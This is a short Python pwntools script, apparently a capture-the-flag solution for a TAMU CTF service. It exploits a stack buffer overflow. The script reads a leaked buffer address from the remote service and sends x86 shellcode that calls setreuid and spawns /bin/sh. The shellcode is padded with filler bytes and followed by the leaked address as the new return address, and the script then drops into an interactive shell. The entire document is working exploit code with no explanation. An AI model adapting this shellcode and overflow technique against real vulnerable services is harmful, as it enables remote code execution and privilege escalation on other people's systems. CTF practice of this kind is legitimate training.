from pwn import *

r = remote("pwn.ctf.tamu.edu", 4323)

print r.recvuntil("Your random number ")
buf = r.recv(20)[:10]
print r.recvuntil("echo?")

print "buf address : "+ buf
#print type(buf)
buf = int(buf,16)
#print type(buf)
p = "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
p += "A"* (242-47)
p += p32(buf)
print p
r.sendline(p)

print r.recv(1024)
print r.recv(1024)

r.interactive()
